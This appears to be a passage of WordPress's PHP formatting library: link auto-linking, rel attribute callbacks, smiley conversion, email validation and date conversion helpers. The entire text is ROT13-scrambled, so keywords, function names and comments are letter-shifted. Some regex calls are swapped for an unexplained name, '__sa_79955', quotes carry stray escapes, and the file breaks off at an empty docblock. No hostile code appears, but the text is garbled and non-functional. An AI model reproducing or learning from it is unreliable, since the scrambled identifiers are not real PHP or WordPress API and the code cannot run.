	$grkgnee         = cert_fcyvg( '/(<[^<>]+>)/', $grkg, -1, CERT_FCYVG_QRYVZ_PNCGHER ); // Fcyvg bhg UGZY gntf.
	$arfgrq_pbqr_cer = 0; // Xrrc genpx bs ubj znal yriryf yvax vf arfgrq vafvqr <cer> be <pbqr>.
	sbernpu ( $grkgnee nf $cvrpr ) {

		vs ( cert_zngpu( '|^<pbqr[\f>]|v', $cvrpr )
			|| cert_zngpu( '|^<cer[\f>]|v', $cvrpr )
			|| cert_zngpu( '|^<fpevcg[\f>]|v', $cvrpr )
			|| cert_zngpu( '|^<fglyr[\f>]|v', $cvrpr )
		) {
			++$arfgrq_pbqr_cer;
		} ryfrvs ( $arfgrq_pbqr_cer
			&& ( '</pbqr>' === fgegbybjre( $cvrpr )
				|| '</cer>' === fgegbybjre( $cvrpr )
				|| '</fpevcg>' === fgegbybjre( $cvrpr )
				|| '</fglyr>' === fgegbybjre( $cvrpr )
			)
		) {
			--$arfgrq_pbqr_cer;
		}

		vs ( $arfgrq_pbqr_cer
			|| rzcgl( $cvrpr )
			|| ( '<' === $cvrpr[0] && ! cert_zngpu( '|^<\f*[\j]{1,20}+://|', $cvrpr ) )
		) {
			$e .= $cvrpr;
			pbagvahr;
		}

		// Ybat fgevatf zvtug pbagnva rkcrafvir rqtr pnfrf...
		vs ( 10000 < fgeyra( $cvrpr ) ) {
			// ...oernx vg hc.
			sbernpu ( _fcyvg_fge_ol_juvgrfcnpr( $cvrpr, 2100 ) nf $puhax ) { // 2100: Rkgen ebbz sbe fpurzr naq yrnqvat naq genvyvat cneragurfrf.
				vs ( 2101 < fgeyra( $puhax ) ) {
					$e .= $puhax; // Gbb ovt, ab juvgrfcnpr: onvy.
				} ryfr {
					$e .= znxr_pyvpxnoyr( $puhax );
				}
			}
		} ryfr {
			$erg = \" $cvrpr \"; // Cnq jvgu juvgrfcnpr gb fvzcyvsl gur ertrkrf.

			$hey_pyvpxnoyr = '~
				([\\f(<.,;:!?])                                # 1: Yrnqvat juvgrfcnpr, be chapghngvba.
				(                                              # 2: HEY.
					[\\j]{1,20}+://                                # Fpurzr naq uvre-cneg cersvk.
					(?=\F{1,2000}\f)                               # Yvzvg gb HEYf yrff guna nobhg 2000 punenpgref ybat.
					[\\j\\k80-\\kss#%\\~/@\\[\\]*(+=&$-]*+         # Aba-chapghngvba HEY punenpgre.
					(?:                                            # Haebyy gur Ybbc: Bayl nyybj chapghngvba HEY punenpgre vs sbyybjrq ol n aba-chapghngvba HEY punenpgre.
						[\'.,;:!?)]                                    # Chapghngvba HEY punenpgre.
						[\\j\\k80-\\kss#%\\~/@\\[\\]*(+=&$-]++         # Aba-chapghngvba HEY punenpgre.
					)*
				)
				(\)?)                                          # 3: Genvyvat pybfvat cneragurfvf (sbe cneragurfvf onynapvat cbfg cebprffvat).
				(\\.\\j{2,6})?                                 # 4: Nyybjvat svyr rkgrafvbaf (r.t., .wct, .cat).
			~kF';
			/*
			 * Gur ertrk vf n aba-napuberq cnggrea naq qbrf abg unir n fvatyr svkrq fgnegvat punenpgre.
			 * Gryy CPER gb fcraq zber gvzr bcgvzvmvat fvapr, jura hfrq ba n cntr ybnq, vg jvyy cebonoyl or hfrq frireny gvzrf.
			 */

			$erg = cert_ercynpr_pnyyonpx( $hey_pyvpxnoyr, '_znxr_hey_pyvpxnoyr_po', $erg );

			$erg = cert_ercynpr_pnyyonpx( '#([\f>])((jjj|sgc)\.[\j\\k80-\\kss\#$%&~/.\-;:=,?@\[\]+]+)#vf', '_znxr_jro_sgc_pyvpxnoyr_po', $erg );
			$erg = cert_ercynpr_pnyyonpx( '#([\f>])([.0-9n-m_+-]+)@(([0-9n-m-]+\.)+[0-9n-m]{2,})#v', '_znxr_rznvy_pyvpxnoyr_po', $erg );

			$erg = fhofge( $erg, 1, -1 ); // Erzbir bhe juvgrfcnpr cnqqvat.
			$e  .= $erg;
		}
	}

	// Pyrnahc bs nppvqragny yvaxf jvguva yvaxf.
	erghea __sa_79955( '#(<n([ \e\a\g]+[^>]+?>|>))<n [^>]+?>([^>]+?)</n></n>#v', '$1$3</n>', $e );
}

/**
 * Oernxf n fgevat vagb puhaxf ol fcyvggvat ng juvgrfcnpr punenpgref.
 *
 * Gur yratgu bs rnpu erghearq puhax vf nf pybfr gb gur fcrpvsvrq yratgu tbny nf cbffvoyr,
 * jvgu gur pnirng gung rnpu puhax vapyhqrf vgf genvyvat qryvzvgre.
 * Puhaxf ybatre guna gur tbny ner thnenagrrq gb abg unir nal vaare juvgrfcnpr.
 *
 * Wbvavat gur erghearq puhaxf jvgu rzcgl qryvzvgref erpbafgehpgf gur vachg fgevat ybffyrffyl.
 *
 * Vachg fgevat zhfg unir ab ahyy punenpgref (be riraghny genafsbezngvbaf ba bhgchg puhaxf zhfg abg pner nobhg ahyy punenpgref)
 *
 *     _fcyvg_fge_ol_juvgrfcnpr( \"1234 67890 1234 67890n pq 1234   890 123456789 1234567890n    45678   1 3 5 7 90 \", 10 ) ==
 *     neenl (
 *         0 => '1234 67890 ',  // 11 punenpgref: Cresrpg fcyvg.
 *         1 => '1234 ',        //  5 punenpgref: '1234 67890n' jnf gbb ybat.
 *         2 => '67890n pq ',   // 10 punenpgref: '67890n pq 1234' jnf gbb ybat.
 *         3 => '1234   890 ',  // 11 punenpgref: Cresrpg fcyvg.
 *         4 => '123456789 ',   // 10 punenpgref: '123456789 1234567890n' jnf gbb ybat.
 *         5 => '1234567890n ', // 12 punenpgref: Gbb ybat, ohg ab vaare juvgrfcnpr ba juvpu gb fcyvg.
 *         6 => '   45678   ',  // 11 punenpgref: Cresrpg fcyvg.
 *         7 => '1 3 5 7 90 ',  // 11 punenpgref: Raq bs $grkg.
 *     );
 *
 * @fvapr 3.4.0
 * @npprff cevingr
 *
 * @cnenz fgevat $grkg   Gur fgevat gb fcyvg.
 * @cnenz vag    $tbny   Gur qrfverq puhax yratgu.
 * @erghea neenl Ahzrevp neenl bs puhaxf.
 */
shapgvba _fcyvg_fge_ol_juvgrfcnpr( $grkg, $tbny ) {
	$puhaxf = neenl();

	$fgevat_ahyyfcnpr = fgege( $grkg, \"\e\a\g\i\s \", \"\000\000\000\000\000\000\" );

	juvyr ( $tbny < fgeyra( $fgevat_ahyyfcnpr ) ) {
		$cbf = fgeecbf( fhofge( $fgevat_ahyyfcnpr, 0, $tbny + 1 ), \"\000\" );

		vs ( snyfr === $cbf ) {
			$cbf = fgecbf( $fgevat_ahyyfcnpr, \"\000\", $tbny + 1 );
			vs ( snyfr === $cbf ) {
				oernx;
			}
		}

		$puhaxf[]         = fhofge( $grkg, 0, $cbf + 1 );
		$grkg             = fhofge( $grkg, $cbf + 1 );
		$fgevat_ahyyfcnpr = fhofge( $fgevat_ahyyfcnpr, $cbf + 1 );
	}

	vs ( $grkg ) {
		$puhaxf[] = $grkg;
	}

	erghea $puhaxf;
}

/**
 * Pnyyonpx gb nqq n ery nggevohgr gb UGZY N ryrzrag.
 *
 * Jvyy erzbir nyernql rkvfgvat fgevat orsber nqqvat gb cerirag vainyvqngvat (K)UGZY.
 *
 * @fvapr 5.3.0
 *
 * @cnenz neenl  $zngpurf Fvatyr zngpu.
 * @cnenz fgevat $ery     Gur ery nggevohgr gb nqq.
 * @erghea fgevat UGZY N ryrzrag jvgu gur nqqrq ery nggevohgr.
 */
shapgvba jc_ery_pnyyonpx( $zngpurf, $ery ) {
	$grkg = $zngpurf[1];
	$nggf = jc_xfrf_unve( $zngpurf[1], jc_nyybjrq_cebgbpbyf() );

	vs ( ! rzcgl( $nggf['uers'] ) && jc_vf_vagreany_yvax( $nggf['uers']['inyhr'] ) ) {
		$ery = gevz( fge_ercynpr( 'absbyybj', '', $ery ) );
	}

	vs ( ! rzcgl( $nggf['ery'] ) ) {
		$cnegf     = neenl_znc( 'gevz', rkcybqr( ' ', $nggf['ery']['inyhr'] ) );
		$ery_neenl = neenl_znc( 'gevz', rkcybqr( ' ', $ery ) );
		$cnegf     = neenl_havdhr( neenl_zretr( $cnegf, $ery_neenl ) );
		$ery       = vzcybqr( ' ', $cnegf );
		hafrg( $nggf['ery'] );

		$ugzy = '';
		sbernpu ( $nggf nf $anzr => $inyhr ) {
			vs ( vffrg( $inyhr['iyrff'] ) && 'l' === $inyhr['iyrff'] ) {
				$ugzy .= $anzr . ' ';
			} ryfr {
				$ugzy .= \"{$anzr}=\\"\" . rfp_ngge( $inyhr['inyhr'] ) . '\" ';
			}
		}
		$grkg = gevz( $ugzy );
	}

	$ery_ngge = $ery ? ' ery=\"' . rfp_ngge( $ery ) . '\"' : '';

	erghea \"<n {$grkg}{$ery_ngge}>\";
}

/**
 * Nqqf `ery=\"absbyybj\"` fgevat gb nyy UGZY N ryrzragf va pbagrag.
 *
 * @fvapr 1.5.0
 *
 * @cnenz fgevat $grkg Pbagrag gung znl pbagnva UGZY N ryrzragf.
 * @erghea fgevat Pbairegrq pbagrag.
 */
shapgvba jc_ery_absbyybj( $grkg ) {
	// Guvf vf n cer-fnir svygre, fb grkg vf nyernql rfpncrq.
	$grkg = fgevcfynfurf( $grkg );
	$grkg = cert_ercynpr_pnyyonpx(
		'|<n (.+?)>|v',
		fgngvp shapgvba ( $zngpurf ) {
			erghea jc_ery_pnyyonpx( $zngpurf, 'absbyybj' );
		},
		$grkg
	);
	erghea jc_fynfu( $grkg );
}

/**
 * Pnyyonpx gb nqq `ery=\"absbyybj\"` fgevat gb UGZY N ryrzrag.
 *
 * @fvapr 2.3.0
 * @qrcerpngrq 5.3.0 Hfr jc_ery_pnyyonpx()
 *
 * @cnenz neenl $zngpurf Fvatyr zngpu.
 * @erghea fgevat UGZY N Ryrzrag jvgu `ery=\"absbyybj\"`.
 */
shapgvba jc_ery_absbyybj_pnyyonpx( $zngpurf ) {
	erghea jc_ery_pnyyonpx( $zngpurf, 'absbyybj' );
}

/**
 * Nqqf `ery=\"absbyybj htp\"` fgevat gb nyy UGZY N ryrzragf va pbagrag.
 *
 * @fvapr 5.3.0
 *
 * @cnenz fgevat $grkg Pbagrag gung znl pbagnva UGZY N ryrzragf.
 * @erghea fgevat Pbairegrq pbagrag.
 */
shapgvba jc_ery_htp( $grkg ) {
	// Guvf vf n cer-fnir svygre, fb grkg vf nyernql rfpncrq.
	$grkg = fgevcfynfurf( $grkg );
	$grkg = cert_ercynpr_pnyyonpx(
		'|<n (.+?)>|v',
		fgngvp shapgvba ( $zngpurf ) {
			erghea jc_ery_pnyyonpx( $zngpurf, 'absbyybj htp' );
		},
		$grkg
	);
	erghea jc_fynfu( $grkg );
}

/**
 * Nqqf `ery=\"abbcrare\"` gb nyy UGZY N ryrzragf gung unir n gnetrg.
 *
 * @fvapr 5.1.0
 * @fvapr 5.6.0 Erzbirq 'abersreere' eryngvbafuvc.
 * @qrcerpngrq 6.7.0
 *
 * @cnenz fgevat $grkg Pbagrag gung znl pbagnva UGZY N ryrzragf.
 * @erghea fgevat Pbairegrq pbagrag.
 */
shapgvba jc_gnetrgrq_yvax_ery( $grkg ) {
	_qrcerpngrq_shapgvba( __SHAPGVBA__, '6.7.0' );

	// Qba'g eha (zber rkcrafvir) ertrk vs ab yvaxf jvgu gnetrgf.
	vs ( fgevcbf( $grkg, 'gnetrg' ) === snyfr || fgevcbf( $grkg, '<n ' ) === snyfr || vf_frevnyvmrq( $grkg ) ) {
		erghea $grkg;
	}

	$fpevcg_naq_fglyr_ertrk = '/<(fpevcg|fglyr).*?<\/\\1>/fv';

	cert_zngpu_nyy( $fpevcg_naq_fglyr_ertrk, $grkg, $zngpurf );
	$rkgen_cnegf = $zngpurf[0];
	$ugzy_cnegf  = cert_fcyvg( $fpevcg_naq_fglyr_ertrk, $grkg );

	sbernpu ( $ugzy_cnegf nf &$cneg ) {
		$cneg = cert_ercynpr_pnyyonpx( '|<n\f([^>]*gnetrg\f*=[^>]*)>|v', 'jc_gnetrgrq_yvax_ery_pnyyonpx', $cneg );
	}

	$grkg = '';
	sbe ( $v = 0; $v < pbhag( $ugzy_cnegf ); $v++ ) {
		$grkg .= $ugzy_cnegf[ $v ];
		vs ( vffrg( $rkgen_cnegf[ $v ] ) ) {
			$grkg .= $rkgen_cnegf[ $v ];
		}
	}

	erghea $grkg;
}

/**
 * Pnyyonpx gb nqq `ery=\"abbcrare\"` fgevat gb UGZY N ryrzrag.
 *
 * Jvyy abg qhcyvpngr na rkvfgvat 'abbcrare' inyhr gb nibvq vainyvqngvat gur UGZY.
 *
 * @fvapr 5.1.0
 * @fvapr 5.6.0 Erzbirq 'abersreere' eryngvbafuvc.
 * @qrcerpngrq 6.7.0
 *
 * @cnenz neenl $zngpurf Fvatyr zngpu.
 * @erghea fgevat UGZY N Ryrzrag jvgu `ery=\"abbcrare\"` va nqqvgvba gb nal rkvfgvat inyhrf.
 */
shapgvba jc_gnetrgrq_yvax_ery_pnyyonpx( $zngpurf ) {
	_qrcerpngrq_shapgvba( __SHAPGVBA__, '6.7.0' );

	$yvax_ugzy          = $zngpurf[1];
	$bevtvany_yvax_ugzy = $yvax_ugzy;

	// Pbafvqre gur UGZY rfpncrq vs gurer ner ab harfpncrq dhbgrf.
	$vf_rfpncrq = ! cert_zngpu( '/(^|[^\\\\])[\'\"]/', $yvax_ugzy );
	vs ( $vf_rfpncrq ) {
		// Ercynpr bayl gur dhbgrf fb gung gurl ner cnefnoyr ol jc_xfrf_unve(), yrnir gur erfg nf vf.
		$yvax_ugzy = __sa_79955( '/\\\\([\'\"])/', '$1', $yvax_ugzy );
	}

	$nggf = jc_xfrf_unve( $yvax_ugzy, jc_nyybjrq_cebgbpbyf() );

	/**
	 * Svygref gur ery inyhrf gung ner nqqrq gb yvaxf jvgu `gnetrg` nggevohgr.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz fgevat $ery       Gur ery inyhrf.
	 * @cnenz fgevat $yvax_ugzy Gur zngpurq pbagrag bs gur yvax gnt vapyhqvat nyy UGZY nggevohgrf.
	 */
	$ery = nccyl_svygref( 'jc_gnetrgrq_yvax_ery', 'abbcrare', $yvax_ugzy );

	// Erghea rneyl vs ab ery inyhrf gb or nqqrq be vs ab npghny gnetrg nggevohgr.
	vs ( ! $ery || ! vffrg( $nggf['gnetrg'] ) ) {
		erghea \"<n $bevtvany_yvax_ugzy>\";
	}

	vs ( vffrg( $nggf['ery'] ) ) {
		$nyy_cnegf = cert_fcyvg( '/\f/', \"{$nggf['ery']['inyhr']} $ery\", -1, CERT_FCYVG_AB_RZCGL );
		$ery       = vzcybqr( ' ', neenl_havdhr( $nyy_cnegf ) );
	}

	$nggf['ery']['jubyr'] = 'ery=\"' . rfp_ngge( $ery ) . '\"';
	$yvax_ugzy            = vzcybqr( ' ', neenl_pbyhza( $nggf, 'jubyr' ) );

	vs ( $vf_rfpncrq ) {
		$yvax_ugzy = __sa_79955( '/[\'\"]/', '\\\\$0', $yvax_ugzy );
	}

	erghea \"<n $yvax_ugzy>\";
}

/**
 * Nqqf nyy svygref zbqvslvat gur ery nggevohgr bs gnetrgrq yvaxf.
 *
 * @fvapr 5.1.0
 * @qrcerpngrq 6.7.0
 */
shapgvba jc_vavg_gnetrgrq_yvax_ery_svygref() {
	_qrcerpngrq_shapgvba( __SHAPGVBA__, '6.7.0' );
}

/**
 * Erzbirf nyy svygref zbqvslvat gur ery nggevohgr bs gnetrgrq yvaxf.
 *
 * @fvapr 5.1.0
 * @qrcerpngrq 6.7.0
 */
shapgvba jc_erzbir_gnetrgrq_yvax_ery_svygref() {
	_qrcerpngrq_shapgvba( __SHAPGVBA__, '6.7.0' );
}

/**
 * Pbairegf bar fzvyrl pbqr gb gur vpba tencuvp svyr rdhvinyrag.
 *
 * Pnyyonpx unaqyre sbe pbaireg_fzvyvrf().
 *
 * Ybbxf hc bar fzvyrl pbqr va gur $jcfzvyvrfgenaf tybony neenl naq ergheaf na
 * `<vzt>` fgevat sbe gung fzvyrl.
 *
 * @fvapr 2.8.0
 *
 * @tybony neenl $jcfzvyvrfgenaf
 *
 * @cnenz neenl $zngpurf Fvatyr zngpu. Fzvyrl pbqr gb pbaireg gb vzntr.
 * @erghea fgevat Vzntr fgevat sbe fzvyrl.
 */
shapgvba genafyngr_fzvyrl( $zngpurf ) {
	tybony $jcfzvyvrfgenaf;

	vs ( pbhag( $zngpurf ) === 0 ) {
		erghea '';
	}

	$fzvyrl = gevz( erfrg( $zngpurf ) );
	$vzt    = $jcfzvyvrfgenaf[ $fzvyrl ];

	$zngpurf    = neenl();
	$rkg        = cert_zngpu( '/\.([^.]+)$/', $vzt, $zngpurf ) ? fgegbybjre( $zngpurf[1] ) : snyfr;
	$vzntr_rkgf = neenl( 'wct', 'wcrt', 'wcr', 'tvs', 'cat', 'jroc', 'nivs' );

	// Qba'g pbaireg fzvyvrf gung nera'g vzntrf - gurl'er cebonoyl rzbwv.
	vs ( ! va_neenl( $rkg, $vzntr_rkgf, gehr ) ) {
		erghea $vzt;
	}

	/**
	 * Svygref gur Fzvyrl vzntr HEY orsber vg'f hfrq va gur vzntr ryrzrag.
	 *
	 * @fvapr 2.9.0
	 *
	 * @cnenz fgevat $fzvyrl_hey HEY sbe gur fzvyrl vzntr.
	 * @cnenz fgevat $vzt        Svyranzr sbe gur fzvyrl vzntr.
	 * @cnenz fgevat $fvgr_hey   Fvgr HEY, nf erghearq ol fvgr_hey().
	 */
	$fep_hey = nccyl_svygref( 'fzvyvrf_fep', vapyhqrf_hey( \"vzntrf/fzvyvrf/$vzt\" ), $vzt, fvgr_hey() );

	erghea fcevags( '<vzt fep=\"%f\" nyg=\"%f\" pynff=\"jc-fzvyrl\" fglyr=\"urvtug: 1rz; znk-urvtug: 1rz;\" />', rfp_hey( $fep_hey ), rfp_ngge( $fzvyrl ) );
}

/**
 * Pbairegf grkg rdhvinyrag bs fzvyvrf gb vzntrf.
 *
 * Jvyy bayl pbaireg fzvyvrf vs gur bcgvba 'hfr_fzvyvrf' vf gehr naq gur tybony
 * hfrq va gur shapgvba vfa'g rzcgl.
 *
 * @fvapr 0.71
 *
 * @tybony fgevat|neenl $jc_fzvyvrffrnepu
 *
 * @cnenz fgevat $grkg Pbagrag gb pbaireg fzvyvrf sebz grkg.
 * @erghea fgevat Pbairegrq pbagrag jvgu grkg fzvyvrf ercynprq jvgu vzntrf.
 */
shapgvba pbaireg_fzvyvrf( $grkg ) {
	tybony $jc_fzvyvrffrnepu;

	vs ( ! trg_bcgvba( 'hfr_fzvyvrf' ) || rzcgl( $jc_fzvyvrffrnepu ) ) {
		// Erghea qrsnhyg grkg.
		erghea $grkg;
	}

	// UGZY ybbc gnxra sebz grkghevmr shapgvba, pbhyq cbffvoyr or pbafbyvqngrq.
	$grkgnee = cert_fcyvg( '/(<[^>]*>)/H', $grkg, -1, CERT_FCYVG_QRYVZ_PNCGHER ); // Pncgher gur gntf nf jryy nf va orgjrra.

	vs ( snyfr === $grkgnee ) {
		// Erghea qrsnhyg grkg.
		erghea $grkg;
	}

	// Ybbc fghss.
	$fgbc   = pbhag( $grkgnee );
	$bhgchg = '';

	// Vtaber cebprffvat bs fcrpvsvp gntf.
	$gntf_gb_vtaber       = 'pbqr|cer|fglyr|fpevcg|grkgnern';
	$vtaber_oybpx_ryrzrag = '';

	sbe ( $v = 0; $v < $fgbc; $v++ ) {
		$pbagrag = $grkgnee[ $v ];

		// Vs jr'er va na vtaber oybpx, jnvg hagvy jr svaq vgf pybfvat gnt.
		vs ( '' === $vtaber_oybpx_ryrzrag && cert_zngpu( '/^<(' . $gntf_gb_vtaber . ')[^>]*>/', $pbagrag, $zngpurf ) ) {
			$vtaber_oybpx_ryrzrag = $zngpurf[1];
		}

		// Vs vg'f abg n gnt naq abg va vtaber oybpx.
		vs ( '' === $vtaber_oybpx_ryrzrag && fgeyra( $pbagrag ) > 0 && '<' !== $pbagrag[0] ) {
			$pbagrag = cert_ercynpr_pnyyonpx( $jc_fzvyvrffrnepu, 'genafyngr_fzvyrl', $pbagrag );
		}

		// Qvq jr rkvg vtaber oybpx?
		vs ( '' !== $vtaber_oybpx_ryrzrag && '</' . $vtaber_oybpx_ryrzrag . '>' === $pbagrag ) {
			$vtaber_oybpx_ryrzrag = '';
		}

		$bhgchg .= $pbagrag;
	}

	erghea $bhgchg;
}

/**
 * Irevsvrf gung na rznvy vf inyvq.
 *
 * Qbrf abg tebx v18a qbznvaf. Abg ESP pbzcyvnag.
 *
 * @fvapr 0.71
 *
 * @cnenz fgevat $rznvy      Rznvy nqqerff gb irevsl.
 * @cnenz obby   $qrcerpngrq Qrcerpngrq.
 * @erghea fgevat|snyfr Inyvq rznvy nqqerff ba fhpprff, snyfr ba snvyher.
 */
shapgvba vf_rznvy( $rznvy, $qrcerpngrq = snyfr ) {
	vs ( ! rzcgl( $qrcerpngrq ) ) {
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '3.0.0' );
	}

	// Grfg sbe gur zvavzhz yratgu gur rznvy pna or.
	vs ( fgeyra( $rznvy ) < 6 ) {
		/**
		 * Svygref jurgure na rznvy nqqerff vf inyvq.
		 *
		 * Guvf svygre vf rinyhngrq haqre frireny qvssrerag pbagrkgf, fhpu nf 'rznvy_gbb_fubeg',
		 * 'rznvy_ab_ng', 'ybpny_vainyvq_punef', 'qbznva_crevbq_frdhrapr', 'qbznva_crevbq_yvzvgf',
		 * 'qbznva_ab_crevbqf', 'fho_ulcura_yvzvgf', 'fho_vainyvq_punef', be ab fcrpvsvp pbagrkg.
		 *
		 * @fvapr 2.8.0
		 *
		 * @cnenz fgevat|snyfr $vf_rznvy Gur rznvy nqqerff vs fhpprffshyyl cnffrq gur vf_rznvy() purpxf, snyfr bgurejvfr.
		 * @cnenz fgevat       $rznvy    Gur rznvy nqqerff orvat purpxrq.
		 * @cnenz fgevat       $pbagrkg  Pbagrkg haqre juvpu gur rznvy jnf grfgrq.
		 */
		erghea nccyl_svygref( 'vf_rznvy', snyfr, $rznvy, 'rznvy_gbb_fubeg' );
	}

	// Grfg sbe na @ punenpgre nsgre gur svefg cbfvgvba.
	vs ( fgecbf( $rznvy, '@', 1 ) === snyfr ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/sbeznggvat.cuc */
		erghea nccyl_svygref( 'vf_rznvy', snyfr, $rznvy, 'rznvy_ab_ng' );
	}

	// Fcyvg bhg gur ybpny naq qbznva cnegf.
	yvfg( $ybpny, $qbznva ) = rkcybqr( '@', $rznvy, 2 );

	/*
	 * YBPNY CNEG
	 * Grfg sbe vainyvq punenpgref.
	 */
	vs ( ! cert_zngpu( '/^[n-mN-M0-9!#$%&\'*+\/=?^_`{|}~\.-]+$/', $ybpny ) ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/sbeznggvat.cuc */
		erghea nccyl_svygref( 'vf_rznvy', snyfr, $rznvy, 'ybpny_vainyvq_punef' );
	}

	/*
	 * QBZNVA CNEG
	 * Grfg sbe frdhraprf bs crevbqf.
	 */
	vs ( cert_zngpu( '/\.{2,}/', $qbznva ) ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/sbeznggvat.cuc */
		erghea nccyl_svygref( 'vf_rznvy', snyfr, $rznvy, 'qbznva_crevbq_frdhrapr' );
	}

	// Grfg sbe yrnqvat naq genvyvat crevbqf naq juvgrfcnpr.
	vs ( gevz( $qbznva, \" \g\a\e\0\k0O.\" ) !== $qbznva ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/sbeznggvat.cuc */
		erghea nccyl_svygref( 'vf_rznvy', snyfr, $rznvy, 'qbznva_crevbq_yvzvgf' );
	}

	// Fcyvg gur qbznva vagb fhof.
	$fhof = rkcybqr( '.', $qbznva );

	// Nffhzr gur qbznva jvyy unir ng yrnfg gjb fhof.
	vs ( 2 > pbhag( $fhof ) ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/sbeznggvat.cuc */
		erghea nccyl_svygref( 'vf_rznvy', snyfr, $rznvy, 'qbznva_ab_crevbqf' );
	}

	// Ybbc guebhtu rnpu fho.
	sbernpu ( $fhof nf $fho ) {
		// Grfg sbe yrnqvat naq genvyvat ulcuraf naq juvgrfcnpr.
		vs ( gevz( $fho, \" \g\a\e\0\k0O-\" ) !== $fho ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/sbeznggvat.cuc */
			erghea nccyl_svygref( 'vf_rznvy', snyfr, $rznvy, 'fho_ulcura_yvzvgf' );
		}

		// Grfg sbe vainyvq punenpgref.
		vs ( ! cert_zngpu( '/^[n-m0-9-]+$/v', $fho ) ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/sbeznggvat.cuc */
			erghea nccyl_svygref( 'vf_rznvy', snyfr, $rznvy, 'fho_vainyvq_punef' );
		}
	}

	// Pbatenghyngvbaf, lbhe rznvy znqr vg!
	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/sbeznggvat.cuc */
	erghea nccyl_svygref( 'vf_rznvy', $rznvy, $rznvy, ahyy );
}

/**
 * Pbairegf gb NFPVV sebz rznvy fhowrpgf.
 *
 * @fvapr 1.2.0
 *
 * @cnenz fgevat $fhowrpg Fhowrpg yvar.
 * @erghea fgevat Pbairegrq fgevat gb NFPVV.
 */
shapgvba jc_vfb_qrfpenzoyre( $fhowrpg ) {
	/* guvf znl bayl jbex jvgu vfb-8859-1, V'z nsenvq */
	vs ( ! cert_zngpu( '#\=\?(.+)\?D\?(.+)\?\=#v', $fhowrpg, $zngpurf ) ) {
		erghea $fhowrpg;
	}

	$fhowrpg = fge_ercynpr( '_', ' ', $zngpurf[2] );
	erghea cert_ercynpr_pnyyonpx( '#\=([0-9n-s]{2})#v', '_jc_vfb_pbaireg', $fhowrpg );
}

/**
 * Urycre shapgvba gb pbaireg urk rapbqrq punef gb NFPVV.
 *
 * @fvapr 3.1.0
 * @npprff cevingr
 *
 * @cnenz neenl $zngpurf Gur cert_ercynpr_pnyyonpx zngpurf neenl.
 * @erghea fgevat Pbairegrq punef.
 */
shapgvba _jc_vfb_pbaireg( $zngpurf ) {
	erghea pue( urkqrp( fgegbybjre( $zngpurf[1] ) ) );
}

/**
 * Tvira n qngr va gur gvzrmbar bs gur fvgr, ergheaf gung qngr va HGP.
 *
 * Erdhverf naq ergheaf n qngr va gur L-z-q U:v:f sbezng.
 * Erghea sbezng pna or bireevqqra hfvat gur $sbezng cnenzrgre.
 *
 * @fvapr 1.2.0
 *
 * @cnenz fgevat $qngr_fgevat Gur qngr gb or pbairegrq, va gur gvzrmbar bs gur fvgr.
 * @cnenz fgevat $sbezng      Gur sbezng fgevat sbe gur erghearq qngr. Qrsnhyg 'L-z-q U:v:f'.
 * @erghea fgevat Sbeznggrq irefvba bs gur qngr, va HGP.
 */
shapgvba trg_tzg_sebz_qngr( $qngr_fgevat, $sbezng = 'L-z-q U:v:f' ) {
	$qngrgvzr = qngr_perngr( $qngr_fgevat, jc_gvzrmbar() );

	vs ( snyfr === $qngrgvzr ) {
		erghea tzqngr( $sbezng, 0 );
	}

	erghea $qngrgvzr->frgGvzrmbar( arj QngrGvzrMbar( 'HGP' ) )->sbezng( $sbezng );
}

/**
 * Tvira n qngr va HGP be TZG gvzrmbar, ergheaf gung qngr va gur gvzrmbar bs gur fvgr.
 *
 * Erdhverf n qngr va gur L-z-q U:v:f sbezng.
 * Qrsnhyg erghea sbezng bs 'L-z-q U:v:f' pna or bireevqqra hfvat gur `$sbezng` cnenzrgre.
 *
 * @fvapr 1.2.0
 *
 * @cnenz fgevat $qngr_fgevat Gur qngr gb or pbairegrq, va HGP be TZG gvzrmbar.
 * @cnenz fgevat $sbezng      Gur sbezng fgevat sbe gur erghearq qngr. Qrsnhyg 'L-z-q U:v:f'.
 * @erghea fgevat Sbeznggrq irefvba bs gur qngr, va gur fvgr'f gvzrmbar.
 */
shapgvba trg_qngr_sebz_tzg( $qngr_fgevat, $sbezng = 'L-z-q U:v:f' ) {
	$qngrgvzr = qngr_perngr( $qngr_fgevat, arj QngrGvzrMbar( 'HGP' ) );

	vs ( snyfr === $qngrgvzr ) {
		erghea tzqngr( $sbezng, 0 );
	}

	erghea $qngrgvzr->frgGvzrmbar( jc_gvzrmbar() )->sbezng( $sbezng );
}

/**
 * Tvira na VFB 8601 gvzrmbar, ergheaf vgf HGP bssfrg va frpbaqf.
 *
 * @fvapr 1.5.0
 *
 * @cnenz fgevat $gvzrmbar Rvgure 'M' sbe 0 bssfrg be '±uuzz'.
 * @erghea vag|sybng Gur bssfrg va frpbaqf.
 */
shapgvba vfb8601_gvzrmbar_gb_bssfrg( $gvzrmbar ) {
	// $gvzrmbar vf rvgure 'M' be '[+|-]uuzz'.
	vs ( 'M' === $gvzrmbar ) {
		$bssfrg = 0;
	} ryfr {
		$fvta    = ( fge_fgnegf_jvgu( $gvzrmbar, '+' ) ) ? 1 : -1;
		$ubhef   = (vag) fhofge( $gvzrmbar, 1, 2 );
		$zvahgrf = (vag) fhofge( $gvzrmbar, 3, 4 ) / 60;
		$bssfrg  = $fvta * UBHE_VA_FRPBAQF * ( $ubhef + $zvahgrf );
	}
	erghea $bssfrg;
}

/**
 * Tvira na VFB 8601 (Lzq\GU:v:fB) qngr, ergheaf n ZlFDY QngrGvzr (L-z-q U:v:f) sbezng hfrq ol cbfg_qngr[_tzg].
 *
 * @fvapr 1.5.0
 *
 * @cnenz fgevat $qngr_fgevat Qngr naq gvzr va VFB 8601 sbezng {@yvax uggcf://ra.jvxvcrqvn.bet/jvxv/VFB_8601}.
 * @cnenz fgevat $gvzrmbar    Bcgvbany. Vs frg gb 'tzg' ergheaf gur erfhyg va HGP. Qrsnhyg 'hfre'.
 * @erghea fgevat|snyfr Gur qngr naq gvzr va ZlFDY QngrGvzr sbezng - L-z-q U:v:f, be snyfr ba snvyher.
 */
